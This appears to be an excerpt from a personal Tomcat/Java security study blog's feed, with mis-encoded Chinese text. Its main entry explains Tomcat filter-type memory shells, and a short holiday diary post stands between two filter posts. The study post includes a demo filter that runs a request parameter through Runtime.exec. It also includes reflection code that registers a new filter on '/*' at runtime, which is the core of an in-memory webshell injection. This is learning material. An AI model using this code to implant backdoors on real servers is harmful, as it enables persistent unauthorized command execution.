    <url>/2022/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B-%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-å†…å­˜é©¬ï¼šFilterå‹â€“ç¬¬äºŒå¤©"><a href="#Tomcat-å†…å­˜é©¬ï¼šFilterå‹â€“ç¬¬äºŒå¤©" class="headerlink" title="Tomcat å†…å­˜é©¬ï¼šFilterå‹â€“ç¬¬äºŒå¤©"></a>Tomcat å†…å­˜é©¬ï¼šFilterå‹â€“ç¬¬äºŒå¤©</h1><p><a href="https://xz.aliyun.com/t/10888">https://xz.aliyun.com/t/10888</a></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTwo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        Filter.<span class="hljs-built_in">super</span>.init(filterConfig);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        servletRequest.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>        servletResponse.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>); <span class="hljs-comment">//ç¼–ç è§£ç </span><br>        filterChain.doFilter(servletRequest,servletResponse);<br>        System.out.println(servletRequest.getParameter(<span class="hljs-string">&quot;xs&quot;</span>));<br>        Runtime.getRuntime().exec(servletRequest.getParameter(<span class="hljs-string">&quot;xs&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;å¼€å§‹è¿‡æ»¤&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        Filter.<span class="hljs-built_in">super</span>.destroy();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ¢ç´¢ä¸€ä¸‹åˆ°åº•å“ªé‡Œæ‰§è¡Œäº†doFilterï¼Œæ‰€ä»¥ç›´æ¥å°±åœ¨doFilterä¸­å†™äº†å‘½ä»¤æ‰§è¡Œï¼Œå®é™…æƒ…å†µä¸å¯èƒ½å‡ºç°è¿™ç§æƒ…å†µã€‚</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><p>åœ¨doFilterä¸‹å¥½æ–­ç‚¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048403.png" alt="QQæˆªå›¾20220412104631"></p><p>è·Ÿè¿›ä¼šæ¥åˆ°è¿™é‡Œã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048289.png" alt="QQæˆªå›¾20220412104720"></p><p>ç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048358.png" alt="QQæˆªå›¾20220412105223">ä¼šæ¥åˆ°è¿™é‡Œè§¦å‘doFilterï¼Œä½†æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯æˆ‘ä»¬è®¾ç½®çš„Filterï¼ˆé¦–å…ˆä¼šé€šè¿‡ç³»ç»Ÿè‡ªå¸¦çš„ï¼‰ã€‚ä½†æ˜¯ä¼šç»è¿‡æ•°ç»„ä¼šè°ƒç”¨åˆ°æˆ‘ä»¬è®¾ç½®çš„TestTwoâ€“Fliterã€‚æœ€åæ¥å—xsçš„å€¼ï¼Œå¼¹å‡ºè®¡ç®—å™¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048858.png" alt="QQæˆªå›¾20220412112403"></p><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ApplicationFilterChain<span class="hljs-meta">#doFilter</span><br>ApplicationFilterChain<span class="hljs-meta">#internalDoFilter \\é€šè¿‡æ•°ç»„çš„å½¢å¼è®©å…¶ç»è¿‡è‡ªå·±çš„è¿‡æ»¤å™¨</span><br></code></pre></td></tr></table></figure><h2 id="StandardWrapperValve-invoke"><a href="#StandardWrapperValve-invoke" class="headerlink" title="StandardWrapperValve#invoke"></a>StandardWrapperValve#invoke</h2><p>æ ¹æ®è°ƒç”¨é“¾ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048831.png" alt="QQæˆªå›¾20220412112703"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåˆ›å»ºäº†<code>filterChain</code><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048740.png" alt="QQæˆªå›¾20220412112816"></p><p>å¹¶ä¸”è¿™é‡Œçš„å€¼å·²ç»å˜æˆäº†æˆ‘ä»¬åˆ›å»ºçš„Filterï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¿›å…¥åˆ°ApplicationFilterFactoryä¸­æŸ¥çœ‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048341.png" alt="QQæˆªå›¾20220412113942"></p><p>å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œè·å–åˆ°äº†è¿‡æ»¤å™¨çš„ä¸€äº›ç›¸å…³ä¸œè¥¿ã€‚</p><p>è€Œè¿™ä¸ªcontextæ˜¯ä»å¦ä¸€ä¸ªç±»åˆ›å»ºè€Œæ¥çš„ï¼Œè€Œè¿™ä¸ªç±»æˆ‘ä»¬æ°å¥½åˆæ˜¯å¯ä»¥åˆ©ç”¨åå°„æ¥åˆ›å»ºå¯¹è±¡çš„ã€‚ç»§ç»­è°ƒè¯•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048933.png" alt="QQæˆªå›¾20220412114817"></p><p>æ¥åˆ°è¿™é‡Œï¼Œè¿™é‡Œæ˜¯å°†filterConfigæ·»åŠ åˆ°filterChianä¸­ã€‚è¿™é‡Œçš„filterConfigæ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨filterChainè°ƒç”¨addFilteræ—¶ï¼Œå°†filteræ·»åŠ è¿›å»ã€‚è¿™é‡Œçš„filterConfigéƒ½æ˜¯ç”±contextä¸­å¾—åˆ°çš„ã€‚æ‰€ä»¥åªè¦æ§åˆ¶contextï¼Œå°±å¯ä»¥è§¦å‘æ¼æ´ã€‚</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arcade">FilterDefsï¼šå­˜æ”¾ FilterDef çš„æ•°ç»„ ï¼ŒFilterDef ä¸­å­˜å‚¨ç€æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹<br>ç­‰åŸºæœ¬ä¿¡æ¯<br>FilterConfigsï¼šå­˜æ”¾ filterConfig çš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ<br><span class="hljs-built_in">Filter</span> å¯¹è±¡ç­‰ä¿¡æ¯<br>FilterMapsï¼šå­˜æ”¾ FilterMap çš„æ•°ç»„ï¼Œåœ¨ FilterMap ä¸­ä¸»è¦å­˜æ”¾äº† FilterName å’Œ å¯¹<br>åº”çš„ URLPattern<br><br>åªè¦æˆ‘ä»¬å°†<span class="hljs-built_in">filter</span> ï¼ŒFilterDefsï¼ŒFilterMapsæ·»åŠ åˆ°FilterConfigsä¸­å°±å¯ä»¥æ·»åŠ <span class="hljs-built_in">filter</span>äº†<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ServletContextï¼š<br>javax.servlet.ServletContextServletè§„èŒƒä¸­è§„å®šäº†çš„ä¸€ä¸ªServletContextæ¥å£ï¼Œæä¾›äº†Webåº”ç”¨æ‰€æœ‰Servletçš„è§†å›¾ï¼Œé€šè¿‡å®ƒå¯ä»¥å¯¹æŸä¸ªWebåº”ç”¨çš„å„ç§èµ„æºå’ŒåŠŸèƒ½è¿›è¡Œè®¿é—®ã€‚WEBå®¹å™¨åœ¨å¯åŠ¨æ—¶ï¼Œå®ƒä¼šä¸ºæ¯ä¸ªWebåº”ç”¨ç¨‹åºéƒ½åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ServletContextï¼Œå®ƒä»£è¡¨å½“å‰Webåº”ç”¨ã€‚å¹¶ä¸”å®ƒè¢«æ‰€æœ‰å®¢æˆ·ç«¯å…±äº«ã€‚ <br><br>ApplicationContextï¼š<br>org.apache.catalina.core.ApplicationContext<br>å¯¹åº”Tomcatå®¹å™¨ï¼Œä¸ºäº†æ»¡è¶³Servletè§„èŒƒï¼Œå¿…é¡»åŒ…å«ä¸€ä¸ªServletContextæ¥å£çš„å®ç°ã€‚Tomcatçš„Contextå®¹å™¨ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªApplicationContextã€‚<br><br>StandardContextï¼š<br>Catalinaä¸»è¦åŒ…æ‹¬Connectorå’ŒContainerï¼ŒStandardContextå°±æ˜¯ä¸€ä¸ªContainerï¼Œå®ƒä¸»è¦è´Ÿè´£å¯¹è¿›å…¥çš„ç”¨æˆ·è¯·æ±‚è¿›è¡Œå¤„ç†ã€‚å®é™…æ¥è¯´ï¼Œä¸æ˜¯ç”±å®ƒæ¥è¿›è¡Œå¤„ç†ï¼Œè€Œæ˜¯äº¤ç»™å†…éƒ¨çš„valveå¤„ç†ã€‚<br>ä¸€ä¸ªcontextè¡¨ç¤ºäº†ä¸€ä¸ªå¤–éƒ¨åº”ç”¨ï¼Œå®ƒåŒ…å«å¤šä¸ª<span class="hljs-keyword">wrapper</span>ï¼Œæ¯ä¸ª<span class="hljs-keyword">wrapper</span>è¡¨ç¤ºä¸€ä¸ªservletå®šä¹‰ã€‚ï¼ˆTomcat é»˜è®¤çš„ Service æœåŠ¡æ˜¯ Catalinaï¼‰<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048583.png"></p><p>è¿™æ ·ç®—æ˜¯ä¸€ä¸ªå®Œæ•´çš„æµç¨‹ç®—æ˜¯å¼„æ‡‚äº†ã€‚</p><h2 id="è·å–StandardContext"><a href="#è·å–StandardContext" class="headerlink" title="è·å–StandardContext"></a>è·å–StandardContext</h2><p>è¿™é‡Œå› ä¸ºåˆšå…¥é—¨å°±çŸ¥è¯†äº†è§£æœ€ç®€å•çš„ï¼Œä¹Ÿæ˜¯ç½‘ä¸Šæœ€å¸¸è§çš„ã€‚ï¼ˆå‰ææ˜¯å¯ä»¥è·å–åˆ°requestå¯¹è±¡å¾—æ—¶å€™ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.servlet.<span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <span class="hljs-comment">// è·å–å±æ€§</span><br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);  <span class="hljs-comment">//ä»servletContextä¸­è·å–contextå±æ€§-&gt;applicationContext</span><br><br><span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);  <span class="hljs-comment">// è·å–å±æ€§</span><br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);  <span class="hljs-comment">// ä»applicationContextä¸­è·å–contextå±æ€§-&gt;standardContextï¼ŒapplicationContextæ„é€ æ—¶éœ€è¦ä¼ å…¥standardContext</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048703.png" alt="QQæˆªå›¾20220412194236"></p><h2 id="è·å–filterConfigså±æ€§"><a href="#è·å–filterConfigså±æ€§" class="headerlink" title="è·å–filterConfigså±æ€§"></a>è·å–filterConfigså±æ€§</h2><p><strong>filterConfigs:å­˜æ”¾filterConfigçš„æ•°ç»„ï¼Œåœ¨ FilterConfig ä¸­ä¸»è¦å­˜æ”¾ FilterDef å’Œ Filterå¯¹è±¡ç­‰ä¿¡æ¯ã€‚</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>   Configs.setAccessible(<span class="hljs-literal">true</span>);<br>   <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br></code></pre></td></tr></table></figure><h2 id="è·å–FilterDef"><a href="#è·å–FilterDef" class="headerlink" title="è·å–FilterDef"></a>è·å–FilterDef</h2><p><strong>filterRefsï¼šfilterRefçš„æ•°ç»„ FilterDefçš„ä½œç”¨ä¸»è¦ä¸ºæè¿°filterçš„å­—ç¬¦ä¸²åç§°ä¸Filterå®ä¾‹çš„å…³ç³»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>      filterDef.setFilter(filter);<br>      filterDef.setFilterName(name);<br>      filterDef.setFilterClass(filter.getClass().getName());<br>standardContext.addFilterDef(filterDef); \\å°†filterDefæ·»åŠ åˆ°filterDefs<br></code></pre></td></tr></table></figure><h2 id="è·å–FilterMaps"><a href="#è·å–FilterMaps" class="headerlink" title="è·å–FilterMaps"></a>è·å–FilterMaps</h2><p><strong>filterMapsï¼šfilterMapçš„æ•°ç»„(FilterMapä¸­å­˜æ”¾äº†æ‰€æœ‰filterç›¸å…³çš„ä¿¡æ¯åŒ…æ‹¬filterNameå’ŒurlPatternã€‚æœ‰äº†è¿™äº›ä¹‹åï¼Œä½¿ç”¨matchFiltersURLå‡½æ•°å°†æ¯ä¸ªfilterå’Œå½“å‰URLè¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸçš„é€šè¿‡) filterConfigæˆ‘ä»¬çœ‹è¿‡ï¼Œè¿™é‡Œæ³¨æ„ï¼ŒfilterConfig.filterRefå®é™…å’Œcontext.filterRefæŒ‡å‘çš„åœ°å€ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯åŒä¸€ä¸ªä¸œè¥¿</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">FilterMap filterMap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">FilterMap()</span>;<br>    filterMap.add<span class="hljs-constructor">URLPattern(<span class="hljs-string">&quot;/*&quot;</span>)</span>;<br>    filterMap.set<span class="hljs-constructor">FilterName(<span class="hljs-params">name</span>)</span>;<br>    filterMap.set<span class="hljs-constructor">Dispatcher(DispatcherType.REQUEST.<span class="hljs-params">name</span>()</span>);<br><br>    standardContext.add<span class="hljs-constructor">FilterMapBefore(<span class="hljs-params">filterMap</span>)</span>; \\æ˜¯è¯¥è¿‡æ»¤å™¨ä¸ºç¬¬ä¸€ä¸ª<br></code></pre></td></tr></table></figure><h2 id="å®ä¾‹åŒ–ApplicationFilterConfig"><a href="#å®ä¾‹åŒ–ApplicationFilterConfig" class="headerlink" title="å®ä¾‹åŒ–ApplicationFilterConfig"></a>å®ä¾‹åŒ–ApplicationFilterConfig</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">Constructor</span> <span class="hljs-title">constructor</span> = <span class="hljs-title">ApplicationFilterConfig</span>.<span class="hljs-title">class</span>.<span class="hljs-title">getDeclaredConstructor</span><span class="hljs-params">(Context.<span class="hljs-keyword">class</span>,FilterDef.<span class="hljs-keyword">class</span>)</span>;</span><br>      <span class="hljs-keyword">constructor</span>.setAccessible(true);<br>      ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="hljs-keyword">constructor</span>.newInstance(standardContext,filterDef); \\ä¼ å…¥å‚æ•°<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204122048981.png" alt="QQæˆªå›¾20220412204429"></p><h2 id="ä¼ å…¥FilterConfigsä¸­"><a href="#ä¼ å…¥FilterConfigsä¸­" class="headerlink" title="ä¼ å…¥FilterConfigsä¸­"></a>ä¼ å…¥FilterConfigsä¸­</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">filterConfigs.put(name,filterConfig);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3å¤©çš„æ¸…æ˜</title>
    <link href="/2022/04/11/3%E5%A4%A9%E7%9A%84%E6%B8%85%E6%98%8E/"/>
    <url>/2022/04/11/3%E5%A4%A9%E7%9A%84%E6%B8%85%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¸…æ˜"><a href="#æ¸…æ˜" class="headerlink" title="æ¸…æ˜"></a>æ¸…æ˜</h1><p>æ—¶é—´è¿‡å»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä»Šå¤©æ¥è®°å½•ä¸€ä¸‹ã€‚åªèƒ½æ ¹æ®å›¾ç‰‡å›å¿†èµ·é›¶é›¶æ•£æ•£çš„ä¸œè¥¿äº†ã€‚</p><h2 id="ä¹çœ¼æ¡¥"><a href="#ä¹çœ¼æ¡¥" class="headerlink" title="ä¹çœ¼æ¡¥"></a>ä¹çœ¼æ¡¥</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112312105.jpg" alt="8d35bc8f59a0eed98beed0fbdbad4ac"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112311232.jpg" alt="165f4447a635c6d21167ed6ad83c154"></p><h2 id="èŠ±èŠ±"><a href="#èŠ±èŠ±" class="headerlink" title="èŠ±èŠ±"></a>èŠ±èŠ±</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112312766.jpg" alt="e6913bd39789b6071fe6d7f3a5c1e36"></p><p>è¿™ä¸€å¼ ä¸€çœ¼çœ‹è¿‡å»çœŸçš„å¥½åƒæ˜¯è–°è¡£è‰ï¼Œä¸è¿‡å°½ç„¶ä¸æ˜¯ã€‚<del>.</del><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112313370.jpg" alt="3d197c4ae60046e6aa86aef544593c6"></p><h2 id="å®éªŒå®¤"><a href="#å®éªŒå®¤" class="headerlink" title="å®éªŒå®¤"></a>å®éªŒå®¤</h2><p>ç¬¬ä¸€æ¬¡ååœ¨å®éªŒå®¤å­¦ä¹ äº†ä¼šã€‚å¥ˆä½•æœ‰çš„äººç¡çš„æµå£æ°´emmmmâ€¦..<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112314010.jpg" alt="3ec9a42f3a7d89d60e97d93ffc96b63"></p><h2 id="å°æ‰‹å‘€"><a href="#å°æ‰‹å‘€" class="headerlink" title="å°æ‰‹å‘€"></a>å°æ‰‹å‘€</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112314647.jpg" alt="a9f18ef1a94d5c1d1a84f14e19ee437"></p><h2 id="å†’é›¨æ™šé¤"><a href="#å†’é›¨æ™šé¤" class="headerlink" title="å†’é›¨æ™šé¤"></a>å†’é›¨æ™šé¤</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112315296.jpg" alt="bc58b06ad3d4439673e346f88113c61"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112315209.jpg" alt="cf7c44c00562b8cb147fdacb185587f"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112316245.jpg" alt="232c835a2ca22061f6dd49cd9cd2090"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112315231.jpg" alt="8303ed8e045952ad1c3aca34e85044a"></p><p>åº—å‘˜éƒ½è¯´äº†åˆ†é‡è¶³å¤Ÿå“Ÿï¼Œå»ºè®®2-3ä»½èœï¼ŒæŠŠæˆ‘åƒçš„å¥½æ’‘~åˆä¸å¿å¿ƒæµªè´¹ã€‚</p><h2 id="çƒ¤è‚‰"><a href="#çƒ¤è‚‰" class="headerlink" title="çƒ¤è‚‰"></a>çƒ¤è‚‰</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112317852.jpg" alt="c3b4d23fa9b98c05b67e29393a21078"><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204112317914.jpg" alt="46d1324af7d24c921803b65b2c33d00"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ„Ÿè§‰å¥½åƒæ¯æ¬¡å‡ºå»åƒçš„éƒ½å¥½åƒå·®ä¸å¤šï¼ˆå¯ä»¥å»ç©ç‚¹å¥½ç©çš„ï¼Œä¸æ˜¯ä¸Šæµ·æŸäº›äººæ¥å››å·ï¼Œè®©å³¨çœ‰å±±å˜æˆé«˜é£é™©ï¼Œæˆ‘ä»¬å°±æ²¡å»æˆã€‚ï¼‰ï¼Œæˆ‘è§‰å¾—æˆ‘ä»¬åº”è¯¥å°è¯•æ–°é²œåƒçš„ã€‚è¿˜æœ‰äº›åƒçš„åœ°æ–¹æ²¡æœ‰æ‹ç…§(è‡ªåŠ©)ï¼Œä¸‰æ–‡é±¼é…èŠ¥æœ«ï¼Œçœ‹åˆ«äººæŠ–éŸ³ä¸ŠåƒèŠ¥æœ«+ä¸‰æ–‡é±¼åƒçš„å¾ˆé¦™ï¼Œæˆ‘åƒå°±å¥½è¾£å¥½éš¾åƒã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡ä¸‰å¤©éƒ½åœ¨ä¸€èµ·ã€‚ä¹Ÿä¸çŸ¥é“åé¢è¦ä»€ä¹ˆæ—¶å€™æ‰æœ‰ç©ºå‘¢ï¼Ÿå¸Œæœ›ç–«æƒ…å¿«å¿«çš„ç¦»å»â€¦â€¦.</p>]]></content>
    
    
    <categories>
      
      <category>å­¦ç”Ÿæ—¶ä»£çš„æ‹çˆ±</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ±æƒ…</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcatå†…å­˜é©¬ï¼šFilterå‹</title>
    <link href="/2022/04/11/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B/"/>
    <url>/2022/04/11/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AFilter%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-å†…å­˜é©¬ï¼šFilterå‹"><a href="#Tomcat-å†…å­˜é©¬ï¼šFilterå‹" class="headerlink" title="Tomcat å†…å­˜é©¬ï¼šFilterå‹"></a>Tomcat å†…å­˜é©¬ï¼šFilterå‹</h1><p>ä¸ç”¨æƒ³ä»Šå¤©æ™šä¸Šçš„é¢è¯•å¤šåŠä¼šé—®é“å†…å­˜ç ç›¸å…³çš„ä¸œè¥¿ï¼Œå¥ˆä½•è‡ªå·±ä»¥å‰ä¹Ÿå°±åªæ˜¯ç”¨ç½‘ä¸Šçš„ä¸œè¥¿ç°æˆä¸œè¥¿ã€‚æ¥å­¦å­¦å§ï¼Œè‡³å°‘æ™šä¸Šé—®åˆ°äº†è¿˜èƒ½bbä¸¤å¥ã€‚<br><strong>è¿™ç¯‡æ–‡ç« ç›¸å½“äºæ˜¯ä¸ªäº†è§£Filter+ç¯å¢ƒé…ç½®ï¼</strong></p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a><br>ç„¶åä¸ºäº†æ–¹ä¾¿åç»­çš„è°ƒè¯•ï¼Œè®°å¾—å¯¼å…¥<code>catalina.jar</code>åŒ…ã€‚</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        Filter.<span class="hljs-built_in">super</span>.init(filterConfig);<br>        System.out.println(<span class="hljs-string">&quot;Filter åˆå§‹åŒ–åˆ›å»º&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰§è¡Œè¿‡æ»¤æ“ä½œ&quot;</span>);<br>        filterChain.doFilter(servletRequest,servletResponse);<br>    